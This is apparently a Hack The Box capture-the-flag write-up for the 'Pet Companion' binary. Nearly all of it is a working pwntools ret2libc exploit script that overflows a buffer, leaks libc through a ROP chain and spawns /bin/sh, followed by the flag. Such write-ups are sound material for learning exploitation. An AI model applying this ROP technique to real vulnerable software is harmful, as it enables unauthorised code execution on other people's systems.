# Pet Companion

***Tags:*** #ret2libc 
## Initial Analysis
## Solution
This is pretty straightforward ROP chain where we leverage the buffer overflow to control the flow of program execution. What we should do:
- call write to leak the address of write
- return back to main
- call system(/bin/sh)

## Solve Script
``` python
from pwn import *
from ctfkit.bp import *
from ctfkit.calculators import OffsetCalculator

context.binary = 'pet_companion'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# gadgets
g_pop_rdi = 0x0400743
g_pop_rsi_r15 = 0x400741
g_ret = 0x4004de

# sections
got_write = 0x600fd8
plt_write = 0x4004f0

# libc
libc_bin_sh = 0x1b3d88
libc_system = 0x4f420
libc_write = 0x1100f0
libc_start_main = 0x400520

def main():
  proc = get_process()

  # leak the address for write, and reset to main
  payload = b''.join([
    b'A'*0x48,
    p64(g_pop_rsi_r15),
    p64(got_write),
    p64(0),
    p64(plt_write),
    p64(libc_start_main)
  ])

  proc.sendlineafter(b'Set your pet companion\'s current status: ', payload)
  proc.recvuntil(b'Configuring...\n\n')
  leak = int.from_bytes(proc.recv(8).strip(), 'little')

  # calculate libc base
  libc_off = OffsetCalculator(0x0, libc_write, leak)
  off_libc_bin_sh = libc_off.get(libc_bin_sh)
  off_libc_system = libc_off.get(libc_system)

  # call system(/bin/sh)
  payload = b''.join([
    b'A'*0x48,
    p64(g_pop_rdi),
    p64(off_libc_bin_sh),
    p64(g_ret), # needed for alignment
    p64(off_libc_system)
  ])
  proc.sendlineafter(b'Set your pet companion\'s current status: ', payload)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
```

Flag: HTB{c0nf1gur3_w3r_d0g}